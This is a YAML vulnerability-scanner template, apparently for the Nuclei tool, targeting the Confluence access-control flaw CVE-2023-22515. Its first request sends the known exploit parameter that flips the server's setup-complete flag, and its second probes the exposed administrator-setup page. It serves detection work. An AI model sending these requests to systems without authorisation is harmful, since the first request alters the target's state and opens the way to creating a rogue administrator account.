id: CVE-2023-22515
info:
  name: Atlassian Confluence Broken Access Control
  author: AutoRedTeam
  severity: critical
  description: |
    Atlassian Confluence Data Center和Server存在权限绕过漏洞，
    未授权攻击者可创建管理员账户并执行任意代码。
    影响版本: 8.0.0-8.5.1
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22515
    - https://confluence.atlassian.com/security/cve-2023-22515
  tags: confluence, auth-bypass, rce, cve2023

requests:
  # 检测漏洞存在
  - method: GET
    path:
      - "{{BaseURL}}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"
    matchers:
      - type: word
        part: body
        words:
          - "Set up Confluence"
          - "setup/setupadministrator.action"
      - type: status
        status:
          - 200
          - 302
    matchers-condition: and

  # 尝试访问setup页面
  - method: GET
    path:
      - "{{BaseURL}}/setup/setupadministrator.action"
    matchers:
      - type: word
        part: body
        words:
          - "Setup Administrator Account"
          - "administrator"
      - type: status
        status:
          - 200
    matchers-condition: and
